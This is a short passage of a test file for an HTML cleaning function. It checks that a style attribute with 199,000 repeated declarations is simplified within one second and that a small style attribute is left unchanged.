  it("a single style attribute with 199k declarations is simplified in well under 1 second", () => {
    const html = `<p style="${"color:red;".repeat(199_000)}">x</p>`;
    const start = performance.now();
    const r = clean(html, true);
    expect(performance.now() - start).toBeLessThan(1000);
    expect(r.simplified).toBe(true);
  });
  it("an ordinary small style attribute is not simplified", () => {
    const html = '<p style="color:red">x</p>';
    expect(clean(html, true).simplified).toBe(false);
  });
});
